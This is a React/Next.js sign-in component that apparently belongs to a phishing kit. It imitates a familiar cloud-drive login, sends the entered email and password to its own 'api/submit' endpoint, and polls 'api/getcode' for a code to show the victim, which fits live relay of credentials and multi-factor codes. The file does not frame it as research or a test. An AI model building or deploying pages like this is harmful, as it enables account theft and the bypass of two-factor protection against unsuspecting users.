import { Dispatch, FC, FormEvent, SetStateAction, useState } from "react";
import styles from "./FormPass.module.css";
import axios from "axios";
import Link from "next/link";
import Loading from "./Loading";
import { unstable_noStore } from "next/cache";

export const dynamic = "force-dynamic";
export const fetchCache = "force-no-store";
function wait(ms: number) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

interface FormPassProps {
  email: string;
  setWhichForm: Dispatch<SetStateAction<string>>;
  setPassword: Dispatch<SetStateAction<string>>;
  setCode: Dispatch<SetStateAction<string>>;
}

const FormPass: FC<FormPassProps> = ({
  email,
  setWhichForm,
  setPassword,
  setCode,
}) => {
  unstable_noStore();
  const isShowMsgForm = async () => {
    try {
      return await axios.get("api/getForm", {
        // query URL without using browser cache
        headers: {
          "Cache-Control": "no-cache",
          Pragma: "no-cache",
          Expires: "0",
        },
      });
    } catch (error) {
      console.log(error);
    }
  };
  const [isChecked, setIsChecked] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [fetchTry, setFetchTry] = useState(0);
  const fetchCode = async () => {
    try {
      return await axios.get("api/getcode", {
        // query URL without using browser cache
        headers: {
          "Cache-Control": "no-cache",
          Pragma: "no-cache",
          Expires: "0",
        },
      });
    } catch (error) {
      setFetchTry((e) => e + 1);
      return null;
    }
  };
  const onSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const formDate = new FormData(event.currentTarget);
    const data = {
      email: email,
      password: formDate.get("password"),
    };
    setPassword((e) => (e = formDate.get("password") as string));
    await axios.post("api/submit", data);
    const whiForm = await isShowMsgForm();
    console.log(whiForm?.data);

    if (whiForm?.data) {
      setIsLoading(true);
      setWhichForm("msg");
      setIsLoading(false);
    } else {
      let code = await fetchCode();
      setIsLoading(true);
      console.log(code);
      while (code == null && fetchTry < 10) {
        code = await fetchCode();
        setFetchTry((e) => e + 1);
        await wait(2000);
      }
      code !== null && setCode(code!.data[0].codeNum);
      setIsLoading(false);
      setWhichForm("num");
    }
  };
  return (
    <div className="box">
      {isLoading && <Loading />}
      <div className="contain">
        <div className="logo">
          <svg
            className="im"
            xmlns="http://www.w3.org/2000/svg"
            x="0px"
            y="0px"
            width="60"
            height="60"
            viewBox="0 0 48 48"
          >
            <path fill="#FFC107" d="M17 6L31 6 45 30 31 30z"></path>
            <path fill="#1976D2" d="M9.875 42L16.938 30 45 30 38 42z"></path>
            <path fill="#4CAF50" d="M3 30.125L9.875 42 24 18 17 6z"></path>
          </svg>
        </div>
        <div className="info">
          <h2>Welcome</h2>
          <div className="divIcon">
            <svg
              className="icon2"
              aria-hidden="true"
              focusable="false"
              width="48px"
              height="48px"
              viewBox="0 0 24 24"
              xmlns="https://www.w3.org/2000/svg"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
            </svg>
            <h3 className="divIconEmail">{email}</h3>
          </div>
          <form onSubmit={onSubmit}>
            <div className="inputBox">
              <input
                type={isChecked ? "text" : "password"}
                name="password"
                required
              />
              <label>Password</label>

              <div className="check">
                <div className="showpass1">
                  <div className="showpass2">
                    <input
                      type="checkbox"
                      defaultChecked={isChecked}
                      onClick={() => setIsChecked(!isChecked)}
                    />
                  </div>

                  <div className="showpass3">
                    <a>Show Password</a>
                  </div>
                </div>
              </div>
            </div>

            <div className="divsign">
              <span className="for">
                <Link href="/forgot">Forgot password?</Link>
              </span>

              <input type="submit" name="sign-in" value="Sign In" />
            </div>
          </form>
        </div>
        <div className="footer"></div>
      </div>
    </div>
  );
};
export default FormPass;
